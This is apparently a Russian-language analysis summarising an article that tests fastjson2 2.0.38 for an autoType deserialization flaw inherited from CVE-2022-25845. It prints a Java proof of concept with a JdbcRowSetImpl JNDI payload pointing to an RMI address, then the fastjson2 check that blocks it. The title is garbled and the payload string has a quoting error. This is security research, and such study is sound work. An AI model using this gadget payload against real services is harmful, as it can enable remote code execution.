# CVE-2022-25845 (jinjava2 exnted) (Маджуга Богдан Андреевич)

## Описание:

В статье https://paper.seebug.org/3017/ автор рассматривает библиотеку fastjson2** на наличие уязвимсотей ее предшественника fastjson. В качестве уязвимости автор выбрал уязвимость отнаследованную от CVE-2022-25845, которая работала на fastjson версии *1.2.25-1.2.41*. В качестве таргета автор рассматривает fastjson2 версии *2.0.38*.


Первоначально автор пробует запустить уязвимый код напрямую из старой версии:

```
public static void main(String[] args) {
    String poc = "{\"@type\":\"Lcom.sun.rowset.JdbcRowSetImpl;\",\"DataSourceName":\"rmi://127.0.0.1:8085/xxx\",\"AutoCommit\":\"false\"}";
    Object obj = JSON.parse(poc, JSONReader.Feature.UseNativeObject,
    JSONReader.Feature.SupportAutoType);
    System.out.println(obj);
}
```

Как и ожидалось уязвимость не сработала, по причине того, что теперь fastjson2 блокирует выполнение checkAutoType в случае если класс связан с DataSourceName. 

```
  if (ClassLoader.class.isAssignableFrom(clazz) || JDKUtils.isSQLDataSourceOrRowSet(clazz)) {
        throw new JSONException("autoType is not support. " + typeName);
  }
```
